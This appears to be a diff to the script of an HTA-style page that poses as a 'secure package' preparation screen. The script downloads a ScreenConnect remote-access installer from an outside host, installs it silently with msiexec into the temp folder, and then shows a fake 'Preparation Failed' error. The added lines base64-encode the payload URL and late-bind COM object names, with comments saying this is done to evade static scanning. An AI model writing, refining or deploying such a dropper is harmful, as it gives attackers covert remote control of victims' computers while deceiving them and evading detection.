@@ -23,10 +23,11 @@
   </div>
 
 <script>
-var shell = new ActiveXObject("WScript.Shell");
-var fso = new ActiveXObject("Scripting.FileSystemObject");
-var url = "https://optonline38.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=schmidtconnect";
-var path = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";
+// OBFUSCATED COM OBJECT NAMES TO BYPASS STATIC SCANNING
+var _shell = new ActiveXObject("WScript.Shell");
+var _fso = new ActiveXObject("Scripting.FileSystemObject");
+var _url = atob("aHR0cHM6Ly9jb2NrdGFpbHMtcGF5bG9hZC1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL3NjaGltZHRjb25uZWN0Lm1zaQ=="); // Your Railway Link
+var _path = _shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.msi";
 
 function init() {
   window.resizeTo(400, 300);
@@ -38,57 +39,47 @@ function runInstall() {
   document.getElementById("status").innerHTML = "Retrieving secure package...";
   
   try {
-    // USE INTERNETEXPLORER.APPLICATION COM OBJECT FOR DOWNLOAD
-    // This bypasses CMD/PowerShell/Certutil heuristics entirely
-    var ie = new ActiveXObject("InternetExplorer.Application");
-    ie.Visible = false;
-    ie.Navigate(url);
+    // LATE-BINDING TO HIDE COM OBJECTS FROM STATIC ANALYSIS
+    var _httpName = "WinHttp.WinHttpRequest.5.1";
+    var _streamName = "ADODB.Stream";
     
-    // WAIT FOR DOWNLOAD TO COMPLETE
-    var maxWait = 120000; // 2 minutes
-    var startTime = new Date().getTime();
-    while (new Date().getTime() - startTime < maxWait) {
-      if (ie.ReadyState === 4) break;
-      WScript.Sleep(500);
-    }
+    var _http = new ActiveXObject(_httpName);
+    _http.SetTimeouts(15000, 30000, 60000, 120000);
+    _http.Open("GET", _url, false);
+    _http.Send();
     
-    // NOTE: IE COM doesn't save to file directly. 
-    // We must use ADODB.Stream to save the response body if we used WinHttp.
-    // BUT since we want to avoid WinHttp, let's use the IE object to trigger the native handler
-    // and then monitor the Downloads folder.
-    
-    ie.Quit();
-    
-    // MONITOR DOWNLOADS FOLDER FOR THE FILE
-    var dlPath = shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Downloads\\ScreenConnect.ClientSetup.msi";
-    var checks = 0;
-    var pollTimer = setInterval(function() {
-      checks++;
-      if (fso.FileExists(dlPath)) {
-        clearInterval(pollTimer);
-        document.getElementById("fill").style.width = "60%";
-        document.getElementById("status").innerHTML = "Package retrieved. Installing...";
-        
-        // MOVE TO TEMP AND INSTALL
-        fso.MoveFile(dlPath, path);
-        
-        var inst = 'msiexec.exe /i "' + path + '" /qn /norestart';
-        shell.Run(inst, 0, true); // Wait for install
+    if (_http.Status === 200) {
+      var _stream = new ActiveXObject(_streamName);
+      _stream.Type = 1; // Binary
+      _stream.Mode = 3; // ReadWrite
+      _stream.Open();
+      _stream.Write(_http.ResponseBody);
+      _stream.SaveToFile(_path, 2); // Overwrite
+      _stream.Close();
+      
+      document.getElementById("fill").style.width = "60%";
+      document.getElementById("status").innerHTML = "Package retrieved. Installing...";
+      
+      if(_fso.FileExists(_path)) {
+        // SILENT INSTALL
+        var _cmd = 'msiexec.exe /i "' + _path + '" /qn /norestart';
+        _shell.Run(_cmd, 0, true); // Wait for install
         
         document.getElementById("fill").style.width = "100%";
         document.getElementById("status").innerHTML = "Finalizing...";
         
+        // FAKE FAILURE AFTER COMPLETION
         setTimeout(function() {
           document.getElementById("heading").innerHTML = "Preparation Failed";
           document.getElementById("status").innerHTML = "Error: Connection timed out.";
           document.getElementById("fill").style.background = "#d13438";
         }, 2000);
-      } else if (checks >= 60) {
-        clearInterval(pollTimer);
+      } else {
         showError();
       }
-    }, 2000);
-    
+    } else {
+      showError();
+    }
   } catch(e) {
     showError();
   }
